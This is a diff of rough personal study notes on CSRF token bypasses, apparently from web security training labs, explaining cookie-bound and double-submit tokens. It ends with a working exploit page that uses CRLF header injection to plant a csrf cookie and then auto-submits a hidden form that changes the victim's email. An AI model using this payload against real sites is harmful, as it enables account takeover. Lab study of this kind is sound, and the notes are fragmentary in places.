@@ -312,3 +312,80 @@ Some applications do not validate that the token belongs to the same session as 
 In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.
 
 
+CSRF token is a session itself in that case i can just make a re
+
+In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:
+
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+
+How an Attacker Ends Up Controlling Set-Cookie
+
+Subdomain Takeover
+xss 
+header injection
+
+
+CSRF token is simply duplicated in a cookie
+
+
+
+What Is “Double Submit Cookie” CSRF Protection?
+
+Instead of storing CSRF tokens on the server, the app does this:
+
+1️⃣ Generate a CSRF token
+2️⃣ Send it to the browser as a cookie
+3️⃣ Also require the same token in the request body (or header)
+4️⃣ On submit → server checks they match
+
+No server-side token storage. No session binding.
+
+That’s why it’s called double submit — same value submitted twice.
+
+🔍 Your Example — What It Shows
+
+Request:
+
+POST /email/change
+
+Cookie:
+session=1DQGdzYb...
+csrf=R8ov2YBfTY...
+
+Body:
+csrf=R8ov2YBfTY...
+email=wiener@normal-user.com
+
+
+Server validation logic:
+
+if request.body.csrf == request.cookie.csrf:
+    accept
+else:
+    reject
+
+
+<html>
+<body>
+
+<form action="https://0a03004104aa702a80e303f700ea00b8.web-security-academy.net/my-account/change-email" method="POST">
+  <input type="hidden" name="email" value="pwn@evil.com">
+  <input type="hidden" name="csrf" value="attack123">
+</form>
+
+<img src="https://0a03004104aa702a80e303f700ea00b8.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=attack123;%20SameSite=None;%20Secure"
+     onerror="document.forms[0].submit()">
+
+</body>
+</html>
+
+to do's i want to solve the labs
+
+
+
